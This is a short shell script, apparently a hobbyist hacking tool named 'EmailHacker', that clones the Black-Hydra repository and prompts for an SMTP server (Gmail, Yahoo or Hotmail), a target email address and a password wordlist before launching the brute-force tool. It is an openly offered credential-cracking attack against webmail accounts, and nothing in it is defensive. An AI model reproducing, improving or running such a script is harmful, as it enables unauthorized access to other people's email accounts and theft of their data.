figlet -f standard "EmailHacker"

echo Simple Email Cracking Script in Termux/Terminal/Kali
echo Written By: SAINTMALIK
echo Installing Black hydra.....
echo Be patient if you have installed already..
git clone https://github.com/Gameye98/Black-Hydra.git
echo NOTE: Make sure you have wordlists !
echo Let us Begin:
echo Choose a SMTP service: Gmail = smtp.gmail.com / Yahoo = smtp.mail.yahoo.com / Hotmail = smtp.live.com /:
read smtp
echo Enter Email Address:
read email
echo Provide Directory of Wordlist for Passwords:
read wordlist
python2 blackhydra.py

